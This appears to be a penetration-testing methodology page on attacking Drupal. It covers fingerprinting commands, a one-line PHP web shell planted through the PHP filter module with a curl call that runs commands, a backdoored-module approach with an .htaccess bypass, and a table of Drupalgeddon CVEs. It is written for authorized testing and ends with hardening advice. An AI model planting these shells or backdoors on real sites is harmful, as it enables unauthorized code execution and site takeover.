---
layout: page
title: "Drupal"
subtitle: "Fingerprinting Drupal, abusing admin module features and known remote code execution issues"
permalink: /methodology/common-apps/drupal/
---

Drupal is a PHP content management system that organises content as nodes. Obtaining code execution through the admin console is less direct than in WordPress, because Drupal does not let administrators edit PHP files in a theme. The routes that remain are the PHP filter module on older versions, the module upload function, and a set of remote code execution issues in specific Drupal core releases.

## 1. Discover and fingerprint

- The footer text "Powered by Drupal", the `generator` meta tag and the presence of `/node/1` are strong indicators.
- The `CHANGELOG.txt` and `README.txt` files can give a version, but newer releases block them.

```bash
$ curl -s http://TARGET_URL | grep Drupal
$ curl -s http://TARGET_URL/CHANGELOG.txt | grep -m2 ""
```

- When the changelog is blocked, use a scanner such as droopescan. It reports possible versions from file hashes and identifies plugins such as the PHP module.

```bash
$ droopescan scan drupal -u http://TARGET_URL
```

Drupal's default roles are administrator, authenticated user and anonymous. Note which roles accept self-registration.

## 2. Admin route: PHP filter (older versions)

Before Drupal 8, the PHP filter module could be enabled from the admin console. It evaluates PHP in content. On Drupal 8 and later, the module is not installed by default, but it can be downloaded and installed by an administrator.

1. Enable the PHP filter module in the modules page.
2. Create a Basic page, and set its text format to PHP code.
3. Save the page, then request it with a hard-to-guess parameter name.

```php
<?php
system($_GET['SHELL_PARAM']);
?>
```

```bash
$ curl -s "http://TARGET_URL/node/NODE_ID?SHELL_PARAM=id"
```

The parameter name should be non-standard, and the shell should be removed after testing.

## 3. Admin route: backdoored module

Where administrators can upload modules, a benign module from drupal.org can carry a command handler. Drupal blocks direct access to the modules directory, so an `.htaccess` file is added to allow requests to the PHP file.

```apache
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

After installation, the handler is reached under the module's path, for example `/modules/MODULE_NAME/shell.php`.

## 4. Known issues by version

Confirm the exact version before testing. The notes cover three well-known issues:

| Name | CVE | Affected versions (from notes) | Notes |
| --- | --- | --- | --- |
| Drupalgeddon | CVE-2014-3704 | 7.0 up to 7.31 | Pre-authenticated SQL injection, used to create an admin account or upload content |
| Drupalgeddon2 | CVE-2018-7600 | Before 7.58 and 8.5.1 | Unsanitised input in user registration, leading to remote code execution |
| Drupalgeddon3 | CVE-2018-7602 | Multiple 7.x and 8.x | Authenticated, requires permission to delete a node |

Public modules exist for these issues, including a Metasploit module for Drupalgeddon3 that needs a valid session cookie and a node identifier. Check the rules of engagement before running any exploit that alters the site.

> Drupalgeddon-era exploits can create accounts or write files. Record every change, and remove any account or file created during testing.
{: .warning }

## Decision points

- Admin with PHP filter available: enable it and use a content-based handler.
- Admin with module upload: use a backdoored module, after confirming the destination path.
- Version matches a known issue: confirm with a benign request before exploitation.
- Only an authenticated low-privilege user: check whether the account can delete nodes.

## Defense

Keep Drupal core and modules current, disable or hide the admin login page, restrict who can install modules, and do not enable the PHP filter. See [Application Hardening](/methodology/common-apps/prevention/).
